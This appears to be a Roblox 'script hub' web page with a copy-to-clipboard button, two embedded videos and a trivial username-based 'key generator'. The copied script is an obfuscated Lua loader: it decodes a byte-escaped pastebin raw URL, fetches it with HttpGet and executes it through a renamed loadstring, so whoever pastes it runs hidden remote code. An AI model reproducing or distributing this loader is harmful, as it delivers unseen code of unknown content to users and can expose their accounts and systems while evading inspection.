<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>VelocityHandler Hub</title>
<link href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@400;700&display=swap" rel="stylesheet">
<style>
  html, body {
    margin: 0;
    padding: 0;
    height: 100%;
    background-color: #FFF1E6;
    font-family: 'Baloo 2', cursive;
    display: flex;
    flex-direction: column;
  }

  main {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }

  h2 {
    font-size: 48px; /* 타이틀 크기 조절 */
    margin-bottom: 15px;
    color: #6B4C3B;
    text-shadow: 1px 1px 5px rgba(0,0,0,0.1);
    text-align: center;
  }

  .download-btn {
    display: inline-block;
    background: #C19A6B;
    color: #fff;
    padding: 10px 20px;
    border-radius: 15px;
    font-size: 16px;
    font-weight: 700;
    cursor: pointer;
    transition: all 0.3s;
    box-shadow: 0 5px 10px rgba(0,0,0,0.1);
    margin-bottom: 20px;
  }

  .download-btn:disabled {
    background: #D8C3A5;
    cursor: not-allowed;
    box-shadow: none;
  }

  .download-btn:hover:enabled {
    transform: scale(1.05);
    box-shadow: 0 8px 15px rgba(0,0,0,0.2);
  }

  .side-bar {
    position: fixed;
    right: 20px;
    top: 50%;
    transform: translateY(-50%);
    background-color: #D9B68C;
    border-radius: 20px;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 15px 10px; /* 조금 더 두껍게 */
    box-shadow: 0 0 10px rgba(0,0,0,0.1);
    gap: 15px; /* 버튼 간격 증가 */
    z-index: 100;
  }

  .side-bar .tab {
    width: 80px;
    height: 60px; /* 세로 버튼 더 크게 */
    display: flex;
    align-items: center;
    justify-content: center;
    text-align: center;
    font-size: 18px;
    color: #fff;
    cursor: pointer;
    padding: 5px 0;
    border-radius: 15px;
    transition: all 0.3s;
  }

  .side-bar .tab.active {
    background: #C19A6B;
    box-shadow: 0 4px 10px rgba(0,0,0,0.15);
  }

  .tab-content {
    display: none;
    flex-direction: column;
    align-items: center;
    animation: fadeIn 0.3s ease;
  }

  .tab-content.active {
    display: flex;
  }

  @keyframes fadeIn {
    from {opacity:0; transform: translateY(10px);}
    to {opacity:1; transform: translateY(0);}
  }

  input.key-input {
    padding: 8px;
    border-radius: 10px;
    border: 1px solid #C19A6B;
    width: 200px;
    margin-bottom: 10px;
    font-family: 'Baloo 2', cursive;
    font-size: 16px;
  }

  .video-container {
    display: flex;
    gap: 20px;
    flex-wrap: wrap;
    justify-content: center;
  }

  iframe {
    border-radius: 10px;
  }

</style>
</head>
<body>

<main>
  <!-- HUB 탭 -->
  <div id="hubTab" class="tab-content active">
    <h2>VelocityHandler HUB</h2>
    <button class="download-btn" onclick="copyScript()">Copy for script ⬇️</button>
    <div class="video-container" style="margin-top:20px;">
      <iframe width="400" height="225" src="https://www.youtube.com/embed/NLl2vuQi42M" title="YouTube video 1" frameborder="0" allowfullscreen></iframe>
      <iframe width="400" height="225" src="https://www.youtube.com/embed/x8CpV6ESlTo" title="YouTube video 2" frameborder="0" allowfullscreen></iframe>
    </div>
  </div>

  <!-- SCRIPT 탭 -->
  <div id="scriptTab" class="tab-content">
    <h2>Script Section</h2>
    <p>Scripts will appear here.</p>
  </div>

  <!-- KEY 탭 -->
  <div id="keyTab" class="tab-content">
    <h2>Key Generator</h2>
    <input type="text" id="username" placeholder="Enter your Roblox username" class="key-input">
    <button class="download-btn" id="createKeyBtn" onclick="createKey()" disabled>Generate Key</button>
    <p id="generatedKey"></p>
  </div>
</main>

<!-- 오른쪽 세로 탭 바 -->
<div class="side-bar">
  <div class="tab active" onclick="openTab('hub')">HUB</div>
  <div class="tab" onclick="openTab('script')">SCRIPT</div>
  <div class="tab" onclick="openTab('key')">KEY</div>
</div>

<script>
  const createKeyBtn = document.getElementById("createKeyBtn");
  const usernameInput = document.getElementById("username");

  usernameInput.addEventListener("input", () => {
    createKeyBtn.disabled = usernameInput.value.trim() === "";
  });

  function copyScript() {
    const s = `local x={HDD=loadstring,GHD=function(u)return game:HttpGet(u)end}
local z="\\104\\116\\116\\112\\115\\58\\47\\47\\112\\97\\115\\116\\101\\98\\105\\110\\46\\99\\111\\109\\47\\114\\97\\119\\47\\116\\86\\82\\70\\77\\112\\76\\87"
local function w(s)local t={}for i=1,#s do t[#t+1]=string.char(s:byte(i))end return table.concat(t)end
local c=x.GHD(w(z))
x["HDD"](c)()`;
    const ta = document.createElement("textarea");
    ta.value = s;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand("copy");
    document.body.removeChild(ta);
    alert("Script copied to clipboard!");
  }

  function createKey() {
    const username = usernameInput.value.trim();
    if(!username) { alert("Please enter your username."); return; }
    const nameLength = username.length;
    const digits = username.match(/\d/g) || [];
    const digitSum = digits.reduce((sum,d) => sum + parseInt(d), 0);
    const keyBase = nameLength + digitSum;
    const secondChar = username[1] || "";
    const finalKey = secondChar + keyBase;
    document.getElementById("generatedKey").innerText = "Your Key: " + finalKey;
  }

  function openTab(tabName) {
    const tabs = ['hub','script','key'];
    tabs.forEach(t => {
      document.getElementById(t+'Tab').classList.remove('active');
      document.querySelector(`.side-bar .tab:nth-child(${tabs.indexOf(t)+1})`).classList.remove('active');
    });
    document.getElementById(tabName+'Tab').classList.add('active');
    document.querySelector(`.side-bar .tab:nth-child(${tabs.indexOf(tabName)+1})`).classList.add('active');
  }
</script>

</body>
</html>
